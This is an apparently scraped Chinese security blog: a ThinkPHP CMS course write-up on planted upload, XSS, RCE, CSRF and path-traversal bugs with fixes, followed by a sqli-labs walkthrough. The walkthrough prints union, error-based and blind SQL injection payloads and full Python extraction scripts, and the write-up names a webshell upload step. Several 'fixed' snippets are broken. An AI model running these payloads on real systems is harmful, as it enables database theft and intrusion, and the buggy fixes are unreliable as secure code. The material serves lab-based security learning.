$path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $path.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;上传成功！&#x27;; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = $path . &#x27;文件夹不存在,请手工创建！&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; 可以看到上面是使用黑名单，对含有黑名单后缀的文件进行替换，显示这样是很不安全的，使用双写即可绕过，造成了文件上传漏洞 漏洞防御 public function photo()&#123; $msg = &#x27;&#x27;; $path = &quot;./uploads/images/photo&quot;; define(&quot;UPLOAD_PATH&quot;,&quot;../public/uploads/images/photo&quot;); if (isset($_POST[&#x27;submit&#x27;]))&#123; if (file_exists(UPLOAD_PATH)) &#123; $uploaded_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $uploaded_size = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;upload_file&#x27; ][ &#x27;type&#x27; ]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; //文件上传漏洞修复 $img_path = $path.&#x27;/&#x27;.$uploaded_name; if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;gif&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27;|| $uploaded_type == &#x27;image/gif&#x27; ) ) &#123; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &#x27;上传成功！&#x27;; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $this-&gt;error(&quot;文件类型不正确&quot;) &#125; &#125; else &#123; $msg = $path . &#x27;文件夹不存在,请手工创建！&#x27;; echo $msg; &#125; &#125; return $this-&gt;fetch(&#x27;/photo&#x27;,[&#x27;msg&#x27;=&gt;$msg,&#x27;path&#x27;=&gt;$img_path]); &#125; 其中if中的条件如下 ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) 保证文件后缀名只能是jpg gif png的一个 ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; ) 文件的MIME必须为三者中的一个 ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) 这是保证文件的大小小10M，并且文件不能空 漏洞点二代码分析改代码位于application\\attachment\\controller\\Upload.php中的saveFile方法 if ($size_limit &gt; 0 &amp;&amp; ($file-&gt;getInfo(&#x27;size&#x27;) &gt; $size_limit)) &#123; return json([ &#x27;status&#x27; =&gt; 0, &#x27;info&#x27; =&gt; &#x27;附件过大&#x27;, &#x27;state&#x27; =&gt; &#x27;附件过大&#x27;, //兼容百度 &#x27;message&#x27; =&gt; &#x27;附件过大&#x27;, //兼容editormd ]); &#125; // 判断附件格式是否符合 $file_name = $file-&gt;getInfo(&#x27;name&#x27;); $error_msg = &#x27;&#x27;; if ($error_msg != &#x27;&#x27;) &#123; return json([ &#x27;code&#x27; =&gt; -1, &#x27;info&#x27; =&gt; $error_msg, &#x27;state&#x27; =&gt; $error_msg, //兼容百度 &#x27;message&#x27; =&gt; $error_msg, //兼容editormd ]); &#125; 可以看到这段代码中只是对上传附件的大小进行了检查，而没有对文件的后缀和文件的MIME进行检查，这样攻击者就可以任意的上传文件，造成文件上传漏洞，危害还是很大的。 漏洞防御方法一 对于其的防御方法就是获取文件的类型然后检查其是否符合要求。这里只允许上传png,jpg,jpeg,gif,bmp类型的文件 $file_ext = strtolower(substr($file_name, strrpos($file_name, &#x27;.&#x27;) + 1));//获取文件的后缀名 // 获取文件的MiME,注意这里不是从客户端的请求头中获取的，而是根据文件的后缀名从php函数中获取，这样就可以防止攻击者修改MIME进行欺骗 try &#123; $fileMine = $file-&gt;getMime(); &#125; catch (\\Exception $ex) &#123; $error_msg = $ex-&gt;getMessage(); &#125; // 禁止MIME为text/x-php或text/html if ($fileMine == &#x27;text/x-php&#x27; || $fileMine == &#x27;text/html&#x27;) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; //禁止后缀名为php的 if (preg_grep(&quot;/php/i&quot;, $ext_limit)) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; // 禁止上传文件名后缀名在$ext_limit中的 if (!preg_grep(&quot;/$file_ext/i&quot;, $ext_limit)) &#123; $error_msg = &#x27;附件类型不正确！&#x27;; &#125; if (!in_array($file_ext, $ext_limit)) &#123; $error_msg = &#x27;附件类型不正确！&#x27;; &#125; // 禁止上传php,html后缀的文件 if($file_ext == &quot;php&quot; || $file_ext == &quot;html&quot;) &#123; $error_msg = &#x27;禁止上传非法文件！&#x27;; &#125; 方法二 对保存文件的目录修改权限。 已经知道，用户上传的文件会被保存到的public/uploads/images目录下，首先查看一下该文件的权限信息 ls -ld images/ 可以看到这是777权限，很明显这个权限设置是不合理的，那么我们将其改为744权限 chmod -R 744 images/ 再来查看之前上传上的木马文件就会发现文件不存在，这样就会避免了一句话木马的危害 8.XSS漏洞点一代码分析if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;用户不存在&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;发送成功！&#x27;); &#125; else &#123; $this-&gt;error(&#x27;发送失败！&#x27;); &#125; 可以看到这里对用户发送的消息，只是检查了接收消息者是否存在，而没有对用户发送的内容进行检查和过滤，给了攻击者可乘之机，这里就需要对用户输入的内容进行过滤。 漏洞防御方法一 使用php自带的函数htmlspecialchars，将一些特殊字符转义，使其无法工作 首先要知道data的结构 /* data的数据结构 array(4) &#123; [&quot;subject&quot;]=&gt; string(3) &quot;sad&quot; [&quot;send_to&quot;]=&gt; string(5) &quot;sunzy&quot; [&quot;content&quot;]=&gt; string(2) &quot;ad&quot; [&quot;send_from&quot;]=&gt; string(5) &quot;admin&quot; &#125; */ if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; // 短消息XSS防御 $data[&#x27;subject&#x27;] = htmlspecialchars($data[&#x27;subject&#x27;]); $data[&#x27;content&#x27;] = htmlspecialchars($data[&#x27;content&#x27;]); if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;用户不存在&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;发送成功！&#x27;); &#125; else &#123; $this-&gt;error(&#x27;发送失败！&#x27;); &#125; &#125; else &#123; return $this-&gt;fetch(); &#125; 此时再发送带有恶意脚本的消息时，该脚本就不会被浏览器执行，而是当作普通的字符串 方法二 这里就用一个很安全的过滤函数，这个函数很难被绕过。 function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27;,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27;,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;,&#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27;,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; 漏洞点二代码分析代码位置application\\member\\controller\\Index.php中的comment方法 很容易看到，没有对提交的数据进行处理，并且将提交的数据在页面使用echo打印出来，导致了XSS漏洞 漏洞防御使用php自带的函数htmlspecialchars，将一些特殊字符转义，使其无法工作，或者使用上面的过滤函数 public function comment()&#123; if($this-&gt;request-&gt;isPost())&#123; $data = $_POST[&#x27;data&#x27;]; $data = htmlspecialchars($data); $userId = $this-&gt;userid; 9.RCE漏洞点一代码分析application\\admin\\phpinfo\\index public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); echo eval($data.&#x27;;&#x27;); &#125; return $this-&gt;fetch(); &#125; eval()函数将传进来的字符串当作php代码执行，导致了命令执行 漏洞防御既然功能就是查看phpinfo，那就设置一个白名单，检查提交的值是否为phpinfo public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); $whitelist = array(&#x27;phpinfo&#x27;); if (in_array($file, $whitelist)) &#123; return eval($data.&#x27;;&#x27;); &#125; else &#123; return $this-&gt;error(&quot;Hacker!&quot;); &#125; &#125; return $this-&gt;fetch(); &#125; 漏洞点二 代码分析 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; 可以看到，这里没有对用户提交的ip地址进行任何检查判断，导致攻击者可以使用管道符恶意的拼接命令，从而导致了命令注入，获取到服务的敏感资源。 漏洞点二漏洞防御方法一 对用户提交的ip的地址进行判断，只有当符合IPv4的地址格式时，才允许执行下一步操作。 具体代码如下 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $is_ip = false; $result = &#x27;&#x27;; $data = explode(&#x27;.&#x27;,$ip); // 利用ipv4地址的特性检查 for($i=0; $i&lt;count($data); $i++)&#123; if($data[$i] &gt; 255 ) &#123; $is_ip = false; &#125; &#125; if(!$is_ip)&#123; $result = &quot;请输入正确的IPv4地址！&quot;; &#125; else&#123; $result = shell_exec(&#x27;ping -c 4&#x27;.$ip); &#125; return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; 方法二 使用php内置的函数对提交的参数进行过滤和转义，使得攻击者输入的一些特殊字符失去原来的作用。 escapeshellcmd和escapeshellarg函数 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $ip = escapeshellcmd($ip); $ip = escapeshellarg($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; 10.CSRF漏洞点一代码分析application\\member\\controller\\Member.php中的jifen方法 漏洞防御首先在前端代码中加入&#123;:token&#125;，让用户每次访问时都携带一个随机token，再在后端页面中检查该token是否正确 $token = [&#x27;__token__&#x27;=&gt; $_POST[&#x27;__token__&#x27;]]; // 设置检查规则 $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // 利用validata函数检查 $result = $this-&gt;validate($token, $rule); // token检查不通过则直接退出，并警告站点不安全。 if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; 漏洞点二，三，四代码分析代码位置application\\member\\controller\\Member.php中的edit方法 public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... 上面的代码只是对提交的数据进行了检查，数据符合规则就会成功，但是没有对请求的来源做任何的检查，这也是做成CSRF漏洞的最大原因。 漏洞防御CSRF漏洞的防御 设置token，与管理员登录页面一样，每次请求的前端页面都会隐藏一个随机产生的token，而在提交请求时这个token也会发送到后端，此时服务器会检查，提交的token是否正确，只有正确时才会进行下一步操作。 referer代表着请求的来源，不可以伪造。但是浏览器可以关闭referer。 禁止第三方网站使用本站Cookie。但是只有个别的浏览器支持。 所以这里选择使用token，修复该漏洞。 前端代码 基本不需要修改，只需要增加一个隐藏的token值，代码位置application\\member\\view\\member\\edit.html 此时的前端页面就会产生一个新标签，就是token值 后端代码 application\\member\\controller\\Member.php中的edit方法 public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); // 获取前端的token值 $token = [&#x27;__token__&#x27;=&gt; $data[&#x27;__token__&#x27;]]; // 设置检查规则 $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // 利用validata函数检查 $result = $this-&gt;validate($token, $rule); // token检查不通过则直接退出，并警告站点不安全。 if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... 再使用bp抓包生成CSRF的poc，此时就不能成功了 11.任意文件下载代码分析代码位于application\\download\\controller\\Index.php中的index方法 public function index() &#123; header(&quot;Content-type:text/html;charset=utf-8&quot;); if($this-&gt;request-&gt;isGet() &amp;&amp; $_GET[&#x27;filename&#x27;] !== null)&#123; if($_GET[&#x27;filename&#x27;] !== &#x27;&#x27;)&#123; $filename = $_GET[&#x27;filename&#x27;]; $filename = &quot;nba/&quot;.$filename; iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,$filename); if(!file_exists($filename))&#123; return $this-&gt;error(&quot;文件不存在！&quot;); &#125; $fp = fopen($filename, &#x27;rb&#x27;); $file_size = filesize($filename); ob_clean(); Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Accept-Ranges: bytes&quot;); Header(&quot;Accept-Length:&quot;.$file_size); Header(&quot;Content-Disposition: attachment; filename=&quot;.basename($filename)); $buffer=1024; $file_count=0; while(!feof($fp) &amp;&amp; $file_count&lt;$file_size)&#123; $file_con=fread($fp,$buffer); $file_count+=$buffer; echo $file_con; &#125; fclose($fp); return view(); &#125; &#125; return view(); &#125; 这里就是实现了一个图片下载的方法，使得用户可以下载public/nba文件夹下的图片，但是并没有对提交的filename参数进行检查和过滤，那么攻击者就可以利用../实现目录的跳转，从而可以下载任意文件 漏洞防御主要的防御方法就是限制用户输入的文件名在程序指定的目录下，那么就是不能使用../进行目录的跳转，并且对用户下载的文件后缀名进行检查 public function check_file($filename)&#123; if(preg_match(&quot;../&quot;, $filename))&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; // 获取文件的MIME 检查是否符合图片类型的要求 $file_type = $_FILES[ $filename ][ &#x27;type&#x27; ]; if($file_type !== &#x27;image/jpeg&#x27; || $file_type !== &#x27;image/png&#x27;|| $file_type !== &#x27;image/gif&#x27;)&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; &#125; 12.unserialize由于这里的反序列化漏洞是一个ctf题目，如果修复了就失去了它了存在的意义，所以这里没有修复方法。但是针对于一般的unserilize，还是有很多防御方法的。 1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能 2.在文件系统函数的参数可控时，对参数进行严格的过滤。 3.严格检查上传文件的内容，而不是只检查文件头。 4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。 而对于这种框架类型的网站,则需要开发者注意使用安全的网站架构,发现漏洞后需要及时修复漏，并且不安全的序列化后的对象，减少使用system,eval等可能被攻击者利用的函数。 13.服务器安全配置防御漏洞php.ini配置 禁止使用的PHP危险函数：Web木马程序通常利用php的特殊函数执行系统命令，查询任意目录文件，增加修改删除文件等。php木马程序常使用的函数为：dl,assert,exec,popen,system,passthru,shell_exec等 在php.ini中添加如下的内容： disable_functions = dl,assert,exec,popen,system,passthru,shell_exec,proc_close,proc_open,pcntl_exec 关闭注册全局变量：在PHP中提交的变量，包括使用POST或者GET提交的变量，会自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以不能让它注册为全局变量，就把注册全局变量选项关闭。 关闭注册全局变量设置： register_globals = Off 开启magic_quotes_gpc：magic_quotes_gpc会把引用的数据中包含单引号’和双引号”以及反斜线 \\自动加上反斜线，自动转译符号，确保数据操作的正确运行，magic_quotes_gpc的设定值将会影响通过Get/Post/Cookies获得的数据，可以有效的防止SQL注入漏洞。 打开magic_quotes_gpc设置： magic_quotes_gpc = On 关闭错误消息显示：php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以服务器建议禁止错误提示。 关闭错误信息显示设置： display_errors = Off 禁止访问远程文件:允许访问URL远程资源使得PHP应用程序的漏洞变得更加容易被利用，php脚本若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传web木马 配置如下： allow_url_fopen = Off allow_url_include = Off 开启php安全模式：php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的读取。 safe_mode = On nginx服务器安全配置修改nginx.conf 禁止敏感文件的直接访问，可以有效的防御文件上传攻击，修改server段 location ~ ^/(uploads|static)/.*.(php|php3|php4|php5|cgi|asp|aspx|jsp|shtml|shtm|pl|cfm|sql|mdb|dll|exe|com|inc|sh)$ &#123; deny all; &#125; 禁止危险IP的访问 //禁止的写法 deny 10.0.0.0/24; //允许的写法 allow 10.0.0.0/24; deny all; 隐藏版本信息 server_tokens off; proxy_hide_header X-Powered-By 代码安全 config/app.php中的app_debug和app_trace设置false，关闭调试模式 默认是域名绑定在public目录，为唯一对外访问目录 务必更改默认密码，并不要设置的过于简单，防止暴力破解 后台禁止访问IP，可以在设置-网站设置中设置 问题与总结问题 数据库连接失败 SQLSTATE[HYO00][2002] Connection refused 解决方法如下 数据库关闭 上面的错误是mysql数据库的容器关闭导致 但是重启时还是立即关闭 查看日志看到如下内容，百度解决 root@sunzy-virtual-machine:~# docker logs -f 250c80740b5b Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored 将mysql文件夹中的my.cnf的权限改为 644 chmon 644 my.cnf 网站的图片无法显示或者css,js代码无法执行 进入nginx服务器的容器内 docker exec -it 容器名 bash cd 进入图片或者css js代码保存的文件夹 使用chmod改变权限 chmod -R 777 文件夹 # -R 参数是递归改变权限 即文件夹内的文件都有777 的权限 总结 提高了自己的动手能力，以及编程能力，加深了对thinkPHP框架的了解，明白了其运行原理，学会了如何编辑一个CMS网站 在编写漏洞的过程中也提高了自己对改漏洞的理解，在以后的学习和工作中能更好的利用和防御漏洞 锻炼了自己的学习能力，从一开始的无从下手，后来通过手册学习后，了解了网站的框架，到后来可以自如的修改网站的页面和后端逻辑代码，对自己的学习能力提升很大，这也是这门课程的重要意义。毕竟学习安全，很多东西是需要自己摸索的，具备独立学习的能力才能在安全的道路上走的更远。","tags":[{"name":"thinkPHP,cms","slug":"thinkPHP-cms","permalink":"https://sunzhengyu99.github.io/tags/thinkPHP-cms/"}]},{"title":"net_a_and_d","date":"2021-03-03T07:09:54.000Z","path":"2021/03/03/net-a-and-d/","text":"[TOC] sql注入level1get提交参数id 首先提交1&#39;，判断是字符型还是数字型注入 这里出现报错，说明是字符类型的，并且是用&#39;将参数id包裹起来的。 接下来就是判断列数，爆表名，爆列名和数据库内容 0x1 确定列数并爆出表名 当列数增加到4的时候开始报错，说明是三列 ?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 0x2 爆列名 ?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ 这里的列名很多 user_id,first_name,last_name,user,password,avatar,last_login,failed_login 0x3 爆出内容 选择password ?id=-1&#x27; union select 1,group_concat(password),3 from users--+ level2同样使用 id=1&#39;，判断是什么类型的注入 可以发现输入的&#39;没有其他的&#39;与之闭合，导致报错，所以这是数字型注入 所以可以直接使用level1的注入语句，只需要删除 ‘ 即可 ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1 union select 1,group_concat(password),3 from users--+ level3提交id=1&#39; 分析一下报错原因 出错的语句为 &#x27;1&#x27;&#x27;) LIMIT 0,1 其中1’输入的内容，所以包裹参数的格式为(&#39;id&#39;) 注入语句可以直接在level1的基础上增加一个 )即可 将原语句修改为 &#x27;1&#x27;) 注入语句 --+ &#x27;) LIMIT 0,1 ?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1&#x27;) union select 1,group_concat(password),3 from users--+ level4同样输入id=1&#39;，但是这次没有报错，才是是使用了&quot;，换成id=1&quot; 很明显和level3基本相同，将&#39;改为&quot;，就是这关的答案 level5这题是字符型注入，但是不在回显所查询的内容，所以是盲注 查看源码也可以发现 不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入 报错注入 (1). 通过floor报错 and (select 1 from (select count(),concat((payload) from users limit 0,1),floor (rand(0)2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 (2). 通过updatexml报错 and updatexml(1,payload,1) 同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。 0x1 确定数据库名 ?id=1&#x27; and extractvalue(1,concat(0x23,database(),0x23))--+ 0x2 爆表名 ?id=1&#x27; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x23))--+ 这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名 0x3 爆列名 ?id=1&#x27; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),0x23))--+ 0x4 爆内容 ?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+ 后面的内容可以通过改变limit后的第一个参数查看 level6与level5很像 但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可 level7提交id=1，出现提示 需要使用outfile函数 在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个 into dumpfile() into outfile() load_file() 这里我们利用outfile函数 首先确定这关包裹参数的格式 一直测试到id=1&#39;)) --+，才显示正确所以可以确定参数的包裹格式为((&#39;id&#39;)) 0x1 向网站根目录写入一句话木马 执行后就可以在根目录中看到这个文件 0x2 使用蚁剑连接 127.0.0.1/3.php 密码:cmd level8根据标题和测试结果可以看出是盲注 首先判断是什么类型注入 提交id=1，显示结果为You are in，可以确定成功查询返回的结果 提交id=1&#39;，没有提示You are in，但是提交id=1&#39; --+，再次出现You are in，可以确定是字符型注入，包裹形式为&#39;id&#39; 接下来就是确定盲注使用的语句，这里可以使用 ascii和substring两个函数 0x1 爆出数据库名 ?id=1&#x27; and ascii(substring(database(),1,1))&gt;97%23 首先假设数据库名的第一个字母的ascii码值大于97，回显为you are in，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。 可以使用脚本完成该过程，脚本跑出的结果为 security 0x2 爆出表名 使用注入语句 id=1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23 最后爆出的表名如下 0x3 爆出列名 id=1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23 0x4 爆出内容 id=1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23 完整脚本如下 import requests url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;You are in&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level9题目标题提示了是基于时间且单引号闭合的盲注 基于时间的盲注需要使用到sleep函数，基本用法如下 分别提交id=1，id=1&#39; and sleep(3) --+，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。 注入脚本只需要改一改level8的即可。 完整脚本如下 import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) 爆破数据库名的过程如下 level10与level9基本相同，只需要将payload中的&#39;换成&quot;即可 完整脚本如下 import requests import datetime url = 